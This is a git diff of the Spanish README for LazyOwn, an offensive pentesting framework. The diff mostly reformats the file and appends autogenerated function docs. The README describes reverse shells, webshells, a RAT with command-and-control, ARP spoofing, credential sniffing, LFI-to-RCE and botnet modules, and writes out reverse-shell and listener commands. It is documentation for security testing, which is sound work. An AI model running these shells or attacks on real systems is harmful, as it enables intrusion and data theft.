@@ -1,11 +1,10 @@
 # LazyOwn
+
 ![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![image](https://github.com/user-attachments/assets/961783c2-cd57-4cc2-ab4c-53fde581db79)
  ![image](https://github.com/user-attachments/assets/79052f87-f87c-4b32-a4a2-854113ca3a4c)
   [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0) ![image](https://github.com/user-attachments/assets/b69f1d31-c075-4713-a44e-a40a034a7407) ![image](https://github.com/user-attachments/assets/df82a669-be0c-4a03-bd98-842a67baaef6)
 
-
 ![lazyown](https://github.com/user-attachments/assets/73097914-3af9-4b8f-8824-ed599dfc7e38)
-
 
 ```sh
 ██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
@@ -54,13 +53,14 @@ Los resultados de los scripts se muestran en la consola en tiempo real, proporci
 
 LazyOwn es un proyecto que partio diseñado para automatizar la búsqueda y análisis de binarios con permisos especiales en sistemas Linux y Windows. El proyecto consta de tres scripts principales que extraen información de [GTFOBins](https://gtfobins.github.io/), analizan los binarios en el sistema y generan opciones basadas en la información recopilada.
 
-https://www.reddit.com/r/LazyOwn/
+<https://www.reddit.com/r/LazyOwn/>
 
 Revolutionize Your Pentesting with LazyOwn: Automate Binary Analysis on Linux and Windows
 
-https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a
+<https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a>
 
 Discover LazyOwn, the ultimate solution for automating the search and analysis of binaries with special permissions on both Linux and Windows systems. Our powerful tool simplifies pentesting, making it more efficient and effective. Watch this video to learn how LazyOwn can streamline your security assessments and enhance your cybersecurity toolkit.
+
 ```sh
 LazyOwn> set target_ip 192.168.1.1
 [SET] target_ip set to 192.168.1.1
@@ -68,6 +68,7 @@ LazyOwn> run lazynmap
 [INFO] Running Nmap scan on 192.168.1.1
 ...
 ```
+
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/9f30a1a3-dfe8-4cc1-9bd7-76c21bdc64b7)
 
 LazyOwn es ideal para profesionales de la ciberseguridad que buscan una solución centralizada y automatizada para sus necesidades de pentesting, ahorrando tiempo y mejorando la eficiencia en la identificación y explotación de vulnerabilidades.
@@ -78,28 +79,29 @@ LazyOwn es ideal para profesionales de la ciberseguridad que buscan una solució
 
 - Python 3.x
 - Módulos de Python:
-     - python-libnmap
-     - pwn
-     - groq
-     - PyPDF2
-     - docx
-     - python-docx
-     - olefile
-     - exifread
-     - pycryptodome
-     - impacket
-     - pandas
-     - colorama
-     - tabulate
-     - pyarrow
-     - keyboard
-     - flask-unsign
-     - name-that-hash
+  - python-libnmap
+  - pwn
+  - groq
+  - PyPDF2
+  - docx
+  - python-docx
+  - olefile
+  - exifread
+  - pycryptodome
+  - impacket
+  - pandas
+  - colorama
+  - tabulate
+  - pyarrow
+  - keyboard
+  - flask-unsign
+  - name-that-hash
 - `subprocess` (incluido en la biblioteca estándar de Python)
 - `platform` (incluido en la biblioteca estándar de Python)
 - `tkinter` (Opcional para el GUI)
 - `numpy` (Opcional para el GUI)
-- 
+-
+
 ## Instalación
 
 1. Clona el repositorio:
@@ -108,15 +110,19 @@ LazyOwn es ideal para profesionales de la ciberseguridad que buscan una solució
 git clone https://github.com/grisuno/LazyOwn.git
 cd LazyOwn
 ```
+
 2. Instala las dependencias de Python:
+
 ```sh
 ./install.sh
 ```
+
 ## Uso
 
 ```sh
 ./run or ./fast_run_as_r00t.sh 
 ```
+
 ```
 Use set <parameter> <value> to set parameters.
 Use show to display current parameter values.
@@ -172,96 +178,97 @@ dig                lazypwn             rpcclient        www
 
 
 ```
-https://www.youtube.com/hashtag/lazyown
+<https://www.youtube.com/hashtag/lazyown>
 
-## Comando	Descripción
-- acknowledgearp	Reconoce y maneja paquetes ARP.
-- acknowledgeicmp	Reconoce y maneja paquetes ICMP.
-- addhosts	Añade hosts a la configuración actual.
-- alias	lista alias para comandos frecuentes.
-- arpscan	Realiza un escaneo ARP en la red.
-- asprevbase64	Convierte datos a base64 para windows para su uso en payloads de powershell.
-- banner	Muestra el banner de bienvenida.
-- bloodhound	Ejecuta la herramienta Bloodhound para enumeración de redes AD.
-- chisel	Usa chisel para crear túneles TCP/UDP a través de HTTP.
-- clean	Limpia archivos o configuraciones temporales.
-- clock	Muestra o ajusta el reloj y calendario del sistema.
-- cme	Ejecuta CrackMapExec para auditorías de red.
-- conptyshell	copia el comando para lanzar una shell conptyshell.
-- cp	Copia archivos de searchsploit al directorio sessions de trabajo.
+## Comando Descripción
+
+- acknowledgearp Reconoce y maneja paquetes ARP.
+- acknowledgeicmp Reconoce y maneja paquetes ICMP.
+- addhosts Añade hosts a la configuración actual.
+- alias lista alias para comandos frecuentes.
+- arpscan Realiza un escaneo ARP en la red.
+- asprevbase64 Convierte datos a base64 para windows para su uso en payloads de powershell.
+- banner Muestra el banner de bienvenida.
+- bloodhound Ejecuta la herramienta Bloodhound para enumeración de redes AD.
+- chisel Usa chisel para crear túneles TCP/UDP a través de HTTP.
+- clean Limpia archivos o configuraciones temporales.
+- clock Muestra o ajusta el reloj y calendario del sistema.
+- cme Ejecuta CrackMapExec para auditorías de red.
+- conptyshell copia el comando para lanzar una shell conptyshell.
+- cp Copia archivos de searchsploit al directorio sessions de trabajo.
 - cports copia comando para mostrar una lista los puertos abiertos en el sistema.
-- createcredentials	Crea archivo credentials en directorio sessions con credenciales de usuario.
-- createhash	Crea archivo hash.txt en directorio sessions con un hashe de contraseña pasado por parametro.
-- createrevshell	Crea una shell reversa para conexiones remotas Linux.
-- createwebshell	Crea una web shell para acceso remoto a servidores web.
-- createwinrevshell	Crea una shell reversa específica para Windows.
-- decrypt	Desencripta datos cifrados.
-- dig	Ejecuta la herramienta dig para consultas DNS.
-- dirsearch	Busca directorios y archivos en servidores web.
-- dnsenum	Enumera registros DNS en un dominio.
-- dnsmap	Mapea subdominios de un dominio objetivo.
-- download_exploit	Descarga exploits de la lista en el directorio external.
-- download_resources	Descarga recursos adicionales necesarios.
-- encrypt	Cifra datos para mayor seguridad.
-- enum4linux	Ejecuta enum4linux para enumeración de redes Windows.
-- exit	Sale de la sesión actual.
-- fixel	Arregla problemas los saltos de linea en sistemas linux.
-- fixperm	Arregla permisos de archivos o directorios.
-- getcap	Obtiene capacidades de archivos en Linux.
-- getnpusers	Obtiene usuarios de no privilegios en redes.
-- getseclist	Obtiene el famoso conjunto de wordlist SecList
-- gobuster	Fuerza bruta directorios y archivos en servidores web.
-- gospider	Ejecuta GoSpider para rastrear sitios web.
-- hashcat	Ejecuta Hashcat para descifrar contraseñas.
-- help	Muestra la ayuda para los comandos disponibles.
-- ignorearp	Ignora paquetes ARP específicos.
-- ignoreicmp	Ignora paquetes ICMP específicos.
-- ip	Muestra o configura las direcciones IP del sistema.
-- john2hash	Convierte resultados de John the Ripper a hashes.
-- lazypwn	Ejecuta secuencias automáticas de hacking.
-- lazywebshell	Crea una web shell.
-- ldapdomaindump	Ejecuta ldapdomaindump para volcar información LDAP.
-- list	Lista los modulos disponibles.
-- msf	Ejecuta Metasploit Framework para explotación automatizada.
-- nbtscan	Ejecuta nbtscan para escanear redes Windows.
-- nc	Ejecuta Netcat para conexiones de red.
-- nikto	Ejecuta Nikto para escanear vulnerabilidades web.
-- nmapscripthelp	Muestra ayuda sobre scripts de Nmap.
-- openssl_sclient	Ejecuta el cliente s_client de OpenSSL.
-- payload	carga el payload desde payload.json
-- ping	Envía paquetes ICMP para verificar conectividad.
-- ports	Lista los puertos abiertos en el sistema.
-- proxy	Configura y usa proxies para uso por ejemplo desde foxyproxy en tu navegador para interceptar las peticiones y poder ver o modificarlas.
-- psexec	Ejecuta comandos en sistemas remotos usando PsExec.
-- py3ttyup	copia comando shell Python 3 con PTY.
-- pyautomate	Automatiza tareas usando pwntomate.
-- qa	Sale sin confirmaciòn de la sessiòn actual
-- responder	Ejecuta Responder para envenenamiento de redes.
-- rev	Copia una shells reversa en portapapeles.
-- rhost	muestra la configuracion de hosts remotos para pruebas.
-- rpcclient	Ejecuta rpcclient para interactuar con servicios RPC.
-- rpcdump	Ejecuta rpcdump para volcar información RPC.
-- rubeus	copia el comando Rubeus para manipulación de tickets Kerberos.
-- run	Ejecuta scripts implementados de la carpeta modules.
-- samrdump	Ejecuta samrdump para volcar SAM de sistemas Windows.
-- set	Configura variables de entorno o parámetros.
-- sh	Ejecuta un commando en la shell.
-- show	Muestra configuraciones o información detallada.
-- smbclient	Ejecuta smbclient para interactuar con recursos compartidos SMB.
-- smbmap	Ejecuta smbmap para mapear recursos SMB.
-- smbserver	Configura y lanza un servidor SMB.
-- snmpcheck	Ejecuta snmpcheck para auditorías SNMP.
-- socat	Ejecuta socat para redireccionar flujos de datos.
-- sqlmap	Ejecuta sqlmap para inyección SQL automatizada.
-- ss	Muestra información sobre una busqueda en searchsploits.
-- sshd	Configura y lanza el servicio SSH.
-- tcpdump_icmp	Ejecuta tcpdump para capturar tráfico ICMP.
-- vpn	Configura y conecta a una VPN.
-- wfuzz	Ejecuta wfuzz para fuerza bruta de aplicaciones web.
-- whatweb	Ejecuta WhatWeb para identificar tecnologías web.
-- winbase64payload	Genera cargas útiles en base64 para Windows.
-- wrapper	Devuelve una mescla de wrappers de php para el uso en ataques lfi
-- www	Configura y lanza un servidor web.
+- createcredentials Crea archivo credentials en directorio sessions con credenciales de usuario.
+- createhash Crea archivo hash.txt en directorio sessions con un hashe de contraseña pasado por parametro.
+- createrevshell Crea una shell reversa para conexiones remotas Linux.
+- createwebshell Crea una web shell para acceso remoto a servidores web.
+- createwinrevshell Crea una shell reversa específica para Windows.
+- decrypt Desencripta datos cifrados.
+- dig Ejecuta la herramienta dig para consultas DNS.
+- dirsearch Busca directorios y archivos en servidores web.
+- dnsenum Enumera registros DNS en un dominio.
+- dnsmap Mapea subdominios de un dominio objetivo.
+- download_exploit Descarga exploits de la lista en el directorio external.
+- download_resources Descarga recursos adicionales necesarios.
+- encrypt Cifra datos para mayor seguridad.
+- enum4linux Ejecuta enum4linux para enumeración de redes Windows.
+- exit Sale de la sesión actual.
+- fixel Arregla problemas los saltos de linea en sistemas linux.
+- fixperm Arregla permisos de archivos o directorios.
+- getcap Obtiene capacidades de archivos en Linux.
+- getnpusers Obtiene usuarios de no privilegios en redes.
+- getseclist Obtiene el famoso conjunto de wordlist SecList
+- gobuster Fuerza bruta directorios y archivos en servidores web.
+- gospider Ejecuta GoSpider para rastrear sitios web.
+- hashcat Ejecuta Hashcat para descifrar contraseñas.
+- help Muestra la ayuda para los comandos disponibles.
+- ignorearp Ignora paquetes ARP específicos.
+- ignoreicmp Ignora paquetes ICMP específicos.
+- ip Muestra o configura las direcciones IP del sistema.
+- john2hash Convierte resultados de John the Ripper a hashes.
+- lazypwn Ejecuta secuencias automáticas de hacking.
+- lazywebshell Crea una web shell.
+- ldapdomaindump Ejecuta ldapdomaindump para volcar información LDAP.
+- list Lista los modulos disponibles.
+- msf Ejecuta Metasploit Framework para explotación automatizada.
+- nbtscan Ejecuta nbtscan para escanear redes Windows.
+- nc Ejecuta Netcat para conexiones de red.
+- nikto Ejecuta Nikto para escanear vulnerabilidades web.
+- nmapscripthelp Muestra ayuda sobre scripts de Nmap.
+- openssl_sclient Ejecuta el cliente s_client de OpenSSL.
+- payload carga el payload desde payload.json
+- ping Envía paquetes ICMP para verificar conectividad.
+- ports Lista los puertos abiertos en el sistema.
+- proxy Configura y usa proxies para uso por ejemplo desde foxyproxy en tu navegador para interceptar las peticiones y poder ver o modificarlas.
+- psexec Ejecuta comandos en sistemas remotos usando PsExec.
+- py3ttyup copia comando shell Python 3 con PTY.
+- pyautomate Automatiza tareas usando pwntomate.
+- qa Sale sin confirmaciòn de la sessiòn actual
+- responder Ejecuta Responder para envenenamiento de redes.
+- rev Copia una shells reversa en portapapeles.
+- rhost muestra la configuracion de hosts remotos para pruebas.
+- rpcclient Ejecuta rpcclient para interactuar con servicios RPC.
+- rpcdump Ejecuta rpcdump para volcar información RPC.
+- rubeus copia el comando Rubeus para manipulación de tickets Kerberos.
+- run Ejecuta scripts implementados de la carpeta modules.
+- samrdump Ejecuta samrdump para volcar SAM de sistemas Windows.
+- set Configura variables de entorno o parámetros.
+- sh Ejecuta un commando en la shell.
+- show Muestra configuraciones o información detallada.
+- smbclient Ejecuta smbclient para interactuar con recursos compartidos SMB.
+- smbmap Ejecuta smbmap para mapear recursos SMB.
+- smbserver Configura y lanza un servidor SMB.
+- snmpcheck Ejecuta snmpcheck para auditorías SNMP.
+- socat Ejecuta socat para redireccionar flujos de datos.
+- sqlmap Ejecuta sqlmap para inyección SQL automatizada.
+- ss Muestra información sobre una busqueda en searchsploits.
+- sshd Configura y lanza el servicio SSH.
+- tcpdump_icmp Ejecuta tcpdump para capturar tráfico ICMP.
+- vpn Configura y conecta a una VPN.
+- wfuzz Ejecuta wfuzz para fuerza bruta de aplicaciones web.
+- whatweb Ejecuta WhatWeb para identificar tecnologías web.
+- winbase64payload Genera cargas útiles en base64 para Windows.
+- wrapper Devuelve una mescla de wrappers de php para el uso en ataques lfi
+- www Configura y lanza un servidor web.
 
 ```sh
 LazyOwn> set binary_name my_binary
@@ -274,10 +281,12 @@ LazyOwn> exit
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/6c8a0b35-cde5-42b3-be73-eb45b3f821f0)
 
-para las busquedas 
+para las busquedas
+
 ```sh
 python3 lazysearch.py binario_a_buscar
 ```
+
 ## Busquedas con GUI
 
 Características adicionales y cambios:
@@ -311,14 +320,14 @@ Esta implementación puede ser intensiva en recursos, ya que recorre todo el sis
 ```sh
 python3 LazyOwnExplorer.py
 ```
+
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94)
 
+para ejecutar una busqueda contra la maquina a analizar
 
-para ejecutar una busqueda contra la maquina a analizar 
 ```sh
 python3 lazyown.py
 ```
-
 
 en el caso de querer actualizar hacemos
 
@@ -328,10 +337,12 @@ rm *.csv
 rm *.parquet
 ./update_db.sh
 ```
+
 El proyecto consta de tres scripts principales:
 
 1. search.py
 Este script extrae información de binarios y sus funciones desde GTFOBins y la guarda en un archivo CSV. ya hice el scraping así que mejor evitar y usar la db que ya tiene en formato csv, a menos que quieran actualizar la db
+
 ```python
 import requests
 from bs4 import BeautifulSoup
@@ -390,6 +401,7 @@ print(f"Datos guardados en {csv_file}")
 ```
 
 ## 2. detailed_search.py
+
 Este script lee el archivo CSV generado por scrape_bins.py, extrae detalles adicionales de cada función y guarda los datos en un segundo archivo CSV.
 
 ```python
@@ -602,8 +614,10 @@ if __name__ == '__main__':
     ejecutar_opciones()
 
 ```
+
 ## Uso modo LazyOwn WebShells
-LazyOwn Webshell Collection es una colleccion de webshells para nuestro framework, el cual nos permite mediante distintos lenguajes establecer una webshell en la maquina donde ejecutemos lazyown webshell basicamente lo que hace es levantar un servidor web dentro del directorio modules para que así esté visible mediante el navegador así podemos tanto disponivilizar los modulos por separados mediante web como tambien podemos acceder al directorio cgi-bin en donde hay 4 shells una bash otra en perl otra en python y en asp por 
+
+LazyOwn Webshell Collection es una colleccion de webshells para nuestro framework, el cual nos permite mediante distintos lenguajes establecer una webshell en la maquina donde ejecutemos lazyown webshell basicamente lo que hace es levantar un servidor web dentro del directorio modules para que así esté visible mediante el navegador así podemos tanto disponivilizar los modulos por separados mediante web como tambien podemos acceder al directorio cgi-bin en donde hay 4 shells una bash otra en perl otra en python y en asp por
 si fuera un windwos
 
 ```sh
@@ -612,31 +626,35 @@ lazywebshell
 
 y listo ya podemos acceder a cualquiera de estas url:
 
-http://localhost:8080/cgi-bin/lazywebshell.sh
+<http://localhost:8080/cgi-bin/lazywebshell.sh>
 
-http://localhost:8080/cgi-bin/lazywebshell.py
+<http://localhost:8080/cgi-bin/lazywebshell.py>
 
-http://localhost:8080/cgi-bin/lazywebshell.asp
+<http://localhost:8080/cgi-bin/lazywebshell.asp>
 
-http://localhost:8080/cgi-bin/lazywebshell.cgi
-
+<http://localhost:8080/cgi-bin/lazywebshell.cgi>
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/fc0ea814-7044-4f8f-8979-02f9579e9df9)
 
 ## Uso Lazy MSFVenom para Reverse Shell
+
 se crearán 3 archivos uno para windows uno para linux y uno para mac con el nombre shell.exe, shell.elf, shell.macho respectivamente y se invoca con el comando run lazymsfvenom
 
 ```sh
 run lazymsfvenom
 ```
+
 ## Uso Lazy PATH Hijacking
+
 se crearán un archivo en /tmp con el nombre de binary_name seteado en payload inicializado con gzip en memoria y como bash en payload parasetear el payload desde el json usar el comando payload para ejecutar usar:
 
 ```sh
 lazypathhijacking
 ```
+
 ## Uso modo LazyOwn RAT
-LazyOwn RAT es una sencilla pero potente Remote Admin Tool Cuenta con una funcion de Screenshot, el cual captura la pantalla del servidor, tiene un comando upload, el cual nos permite subir archivos a la maquina comprometida, y un modo C&C donde podran enviar comandos al servidor, cuenta con dos modos en modo cliente y modo servidor, no tiene ningun tipo de ofuscación y la rat me base en BasicRat acá su github https://github.com/awesome-security/basicRAT y en https://github.com/hash3liZer/SillyRAT aun que está ultima es mucho más completa yo solo queria sacar pantallasos subir archivos y enviar comandos, quizas más adelante agregar funcionalidad de mirar webcams, pero eso más adelante.
+
+LazyOwn RAT es una sencilla pero potente Remote Admin Tool Cuenta con una funcion de Screenshot, el cual captura la pantalla del servidor, tiene un comando upload, el cual nos permite subir archivos a la maquina comprometida, y un modo C&C donde podran enviar comandos al servidor, cuenta con dos modos en modo cliente y modo servidor, no tiene ningun tipo de ofuscación y la rat me base en BasicRat acá su github <https://github.com/awesome-security/basicRAT> y en <https://github.com/hash3liZer/SillyRAT> aun que está ultima es mucho más completa yo solo queria sacar pantallasos subir archivos y enviar comandos, quizas más adelante agregar funcionalidad de mirar webcams, pero eso más adelante.
 
 ```sh
 usage: lazyownserver.py [-h] [--host HOST] [--port PORT] --key KEY
@@ -663,10 +681,9 @@ lazyownreverse 192.168.1.100 8888 #Reverse shell to 192.168.1.100 on port 8888 r
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648)
 
-
 ## Uso modo Lazy Meta Extract0r
-LazyMeta Extract0r es una herramienta diseñada para extraer metadata de varios tipos de archivos, incluidos PDF, DOCX, archivos OLE (como DOC y XLS), y varios formatos de imágenes (JPG, JPEG, TIFF). Esta herramienta recorrerá un directorio especificado, buscará archivos con extensiones compatibles, extraerá la metadata y la guardará en un archivo de salida.
 
+LazyMeta Extract0r es una herramienta diseñada para extraer metadata de varios tipos de archivos, incluidos PDF, DOCX, archivos OLE (como DOC y XLS), y varios formatos de imágenes (JPG, JPEG, TIFF). Esta herramienta recorrerá un directorio especificado, buscará archivos con extensiones compatibles, extraerá la metadata y la guardará en un archivo de salida.
 
 [*] Iniciando: LazyMeta extract0r [;,;]
 
@@ -676,9 +693,11 @@ lazyown_metaextract0r.py: error: the following arguments are required: --path
 ```sh
 python3 lazyown_metaextract0r.py --path /home/user
 ```
+
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/9ec77c01-4bc1-48ab-8c34-7457cff2f79f)
 
 ## Uso modo decrypt encrypt
+
 un metodo de cifrado el cual nos permite tanto encryptar archivos como decencriptar los si se cuenta con la llave obviamente:
 
 ![Captura de pantalla 2024-06-08 231900](https://github.com/grisuno/LazyOwn/assets/1097185/15158dbd-6cd6-4e20-a237-6c89983d42ce)
@@ -691,13 +710,14 @@ decrypt path/to/file.enc key #to decrypt
 ## Uso modo LazyNmap
 
 El uso Lazynmap nos proporciona un script automatizado de un target en este caso 127.0.0.1 utilizando nmap el scipr requiere permisos de administración mediante sudo.
-tambien tiene un modulo de net discovery para saber que hay en el segmento de ip en el que te encuentras. 
+tambien tiene un modulo de net discovery para saber que hay en el segmento de ip en el que te encuentras.
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/48a38836-6cf5-4676-bea8-063e0b5cf7ad)
 
 ```sh
 ./lazynmap.sh -t 127.0.0.1 
 ```
+
 ## Uso modo Chat Generativo por Consola LazyOwn GPT One Liner CLI Assistant y researcher
 
 ¡Descubre la revolución en automatización de tareas de pentesting con el LazyOwn GPT One Liner CLI Assistant! Este increíble script forma parte de la suite de herramientas LazyOwn, diseñadas para hacer tu vida como pentester más eficiente y productiva.
@@ -737,26 +757,27 @@ Con el LazyOwn GPT One Liner CLI Assistant, transforma tu forma de trabajar, hac
 
 [?] Asegúrate de configurar tu API key antes de ejecutar el script:
   export GROQ_API_KEY=<tu_api_key>
-[->] visit: https://console.groq.com/docs/quickstart not sponsored link
+[->] visit: <https://console.groq.com/docs/quickstart> not sponsored link
 
 Requisitos:
 Python 3.x
 Una API key válida de Groq
 Pasos para Obtener la API Key de Groq:
-Visita Groq Console (https://console.groq.com/docs/quickstart) para registrarte y obtener una API key.
-
+Visita Groq Console (<https://console.groq.com/docs/quickstart>) para registrarte y obtener una API key.
 
 ```sh
 export GROQ_API_KEY=<tu_api_key>
 python3 lazygptcli.py --prompt "<tu prompt>" [--debug]          
 ```
+
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/90a95c2a-48d3-4b02-8055-67656c1e71c9)
 
 ## Uso de modo lazyown_bprfuzzer.py
+
 Proporcionar los argumentos según las solicitudes del script: El script solicitará los siguientes argumentos:
 usage: lazyown_bprfuzzer.py [-h] --url URL [--method METHOD] [--headers HEADERS] [--params PARAMS] [--data DATA] [--json_data JSON_DATA]
                    [--proxy_port PROXY_PORT] [-w WORDLIST] [-hc HIDE_CODE]
-                   
+
 lazyburp.py: error: the following arguments are required: --url
 --url: La URL a la que se enviará la solicitud (obligatorio).
 --method: El método HTTP a utilizar, como GET o POST (opcional, valor predeterminado: GET).
@@ -786,7 +807,6 @@ El script reemplazará la palabra LAZYFUZZ en la URL y otros datos con las palab
 Durante la ejecución, el script mostrará los resultados de cada iteración de fuzzing.
 Estas son las formas básicas y avanzadas de usar el script lazyburp.py. Dependiendo de tus necesidades, puedes elegir la forma que mejor se adapte a tu situación específica.
 
-
 ```sh
 python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
     --url "http://127.0.0.1:80/LAZYFUZZ" \
@@ -812,15 +832,18 @@ python3 lazyown_bprfuzzer.py \                                                  
     -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \
  
 ```
+
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/dc66fdc2-cd7d-4b79-92c6-dd43d376ee0e)
 PD: para usar el diccionario que utilizo realizar dentro de /usr/share/seclist el siguiente comando
+
 ```sh
 wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
 && unzip SecList.zip \
 && rm -f SecList.zip
 ```
 
-## Uso modo LazyOwn FTP Sniff 
+## Uso modo LazyOwn FTP Sniff
+
 este modulo sirve para buscar claves en la red de servidores ftp, algunos me dirán que no se ya no se usa pero se sorprenderian en los entornos productivos en infraestructura critica que e visto maquinas con FTP's masivos corriendo en sus servidores :)
 
 ```sh
@@ -830,33 +853,38 @@ run lazyftpsniff
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/d2d1c680-fc03-4f60-adc4-20248f3e3859)
 
-
 ## Uso modo LazyReverseShell
-primero nos ponemos en escucha con el comando 
 
+primero nos ponemos en escucha con el comando
 
 ```sh
 nc -nlvp 1337 #o el puerto que escojamos 
 ```
+
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/dfb7a81d-ac7f-4b8b-8f1f-717e058260b5)
 
-para luego en la maquina victima 
+para luego en la maquina victima
+
 ```sh
 ./lazyreverse_shell.sh --ip 127.0.0.1 --puerto 1337
 ```
+
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190)
 
 ## Uso modo Lazy Curl to recon
+
 el modulo está en modules y se usa así:
 
 ```sh
 chmod +x lazycurl.sh
 ```
+
 Ejecutar el script con los parámetros deseados. Por ejemplo:
 
 ```sh
 ./lazycurl.sh --mode GET --url http://10.10.10.10
 ```
+
 Ejemplos de uso
 
 Enviar una solicitud GET:
@@ -892,7 +920,8 @@ Realizar fuerza bruta con una wordlist:
 Asegúrate de ajustar los parámetros según tus necesidades y de que los valores que pases a las opciones sean válidos para cada caso.
 
 ## Uso modo ARPSpoofing
-el script provee de un ataque de ARPSpoofing mediante scapy en el payload debe ser seteado el lhost rhost y el device que pondràs a arpspoofear 
+
+el script provee de un ataque de ARPSpoofing mediante scapy en el payload debe ser seteado el lhost rhost y el device que pondràs a arpspoofear
 
 ```sh
 set rhost 192.168.1.100
@@ -902,6 +931,7 @@ run lazyarpspoofing
 ```
 
 ## Uso modo LazyGathering
+
 script que nos provee una visión de rayos x en cuanto al sistema en cuestion donde estamos ejecutando la herramiente
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/6d1416f9-10cd-4316-8a62-92c3f10082e0)
@@ -909,12 +939,12 @@ script que nos provee una visión de rayos x en cuanto al sistema en cuestion do
 ```sh
 run lazygath
 ```
+
 ## Uso modo Lazy Own Lfi Rfi 2 Rce
 
 El modo Lfi Rfi 2 Rce es par aprobar algunos payloads más conocidos a los parametros de payload.json
 
 ![image](https://github.com/grisuno/LazyOwn/assets/1097185/4259a469-8c8e-4d11-8db5-39a3bf15059c)
-
 
 ```sh
 payload
@@ -923,7 +953,7 @@ run lazylfi2rce
 
 ## Uso modo LazyOwn Sniffer
 
-https://www.youtube.com/watch?v=_-DDiiMrIlE
+<https://www.youtube.com/watch?v=_-DDiiMrIlE>
 
 El modo sniffer nos permite capturar el trafico de red por interfaces con la opcion -i que es la opción obligatoria, dentro de muchas tras opciones no obligatorias,
 usage: lazysniff.py [-h] -i INTERFACE [-c COUNT] [-f FILTER] [-p PCAP]
@@ -931,11 +961,14 @@ lazysniff.py: error: the following arguments are required: -i/--interface
 
 ![Captura de pantalla 2024-06-05 031231](https://github.com/grisuno/LazyOwn/assets/1097185/db1e05a0-026e-414f-9ec6-0a9ef2cb06fe)
 
-usando desde el framework se debe setear device con set device [eth0, wla0,eth1, wlan1, etc] segun sea su interface y luego: 
+usando desde el framework se debe setear device con set device [eth0, wla0,eth1, wlan1, etc] segun sea su interface y luego:
+
 ```sh
 run lazysniff
 ```
+
 ## Uso modo LazyAtack
+
 Este script de pentesting en Bash permite ejecutar una serie de pruebas de seguridad en modo servidor (máquina víctima) o en modo cliente (máquina atacante). Dependiendo del modo seleccionado, ofrece diferentes opciones y funcionalidades para llevar a cabo diversas acciones de prueba de penetración.
 
 Opciones del Script
@@ -950,7 +983,6 @@ Ofrece opciones como descargar listas de SecLists, escanear puertos, enumerar se
 Ejemplos de Uso
 Uso Básico
 
-
 ```sh
 ./lazyatack.sh --modo servidor --ip 192.168.1.1 --atacante 192.168.1.100
 ```
@@ -958,7 +990,8 @@ Uso Básico
 ```sh
 ./lazyatack.sh --modo cliente --url http://victima.com --ip 192.168.1.10
 ```
-Esto ejecuta el script en modo cliente, configurando la URL de la víctima como http://victima.com y la IP de la víctima como 192.168.1.10.
+
+Esto ejecuta el script en modo cliente, configurando la URL de la víctima como <http://victima.com> y la IP de la víctima como 192.168.1.10.
 
 ## Funciones del Script
 
@@ -990,44 +1023,624 @@ Enumerar Puertos Abiertos: Enumera puertos abiertos.
 Eliminar Contenedores Docker: Elimina todos los contenedores Docker.
 Escanear Red: Escanea la red con secuencia y xargs.
 ```
+
+# Documentation autogenerated by readmeneitor.py
+
+## print_error
+
+funcion para imprimir un error
+
+## print_msg
+
+funcion para imprimir un msg
+
+## print_warn
+
+funcion para imprimir un warn
+
+## signal_handler
+
+No description available.
+
+## check_rhost
+
+chek if rhost is defined
+
+## check_lhost
+
+chek if lhost is defined
+
+## check_lport
+
+chek if lport is defined
+
+## is_binary_present
+
+No description available.
+
+## check_sudo
+
+No description available.
+
+## activate_virtualenv
+
+No description available.
+
+## parse_proc_net_file
+
+No description available.
+
+## get_open_ports
+
+No description available.
+
+## find_credentials
+
+No description available.
+
+## xor_encrypt_decrypt
+
+XOR Encrypt or Decrypt data with a given key
+
+## __init__
+
+No description available.
+
+## default
+
+Handle undefined commands (including aliases).
+
+## one_cmd
+
+No description available.
+
+## set
+
+Set a parameter value. Usage: set <parameter> <value>
+
+## show
+
+Show the current parameter values
+
+## list
+
+List all available scripts in modules directory, they can use apart from the framework too.
+
+## run
+
+Run a specific LazyOwn script to see all scripts to run see: list or help list
+
+## lazysearch
+
+No description available.
+
+## lazysearch_gui
+
+No description available.
+
+## lazyown
+
+No description available.
+
+## update_db
+
+No description available.
+
+## lazynmap
+
+No description available.
+
+## lazywerkzeugdebug
+
+test werkzeug in debugmode
+
+## lazygath
+
+No description available.
+
+## lazynmapdiscovery
+
+No description available.
+
+## lazysniff
+
+No description available.
+
+## lazyftpsniff
+
+No description available.
+
+## lazynetbios
+
+No description available.
+
+## lazyhoneypot
+
+No description available.
+
+## lazygptcli
+
+No description available.
+
+## lazysearch_bot
+
+No description available.
+
+## lazymetaextract0r
+
+No description available.
+
+## lazyownratcli
+
+No description available.
+
+## lazyownrat
+
+No description available.
+
+## lazybotnet
+
+No description available.
+
+## lazylfi2rce
+
+No description available.
+
+## lazylogpoisoning
+
+No description available.
+
+## lazybotcli
+
+No description available.
+
+## lazyssh77enum
+
+No description available.
+
+## lazyburpfuzzer
+
+No description available.
+
+## lazyreverse_shell
+
+No description available.
+
+## lazyarpspoofing
+
+No description available.
+
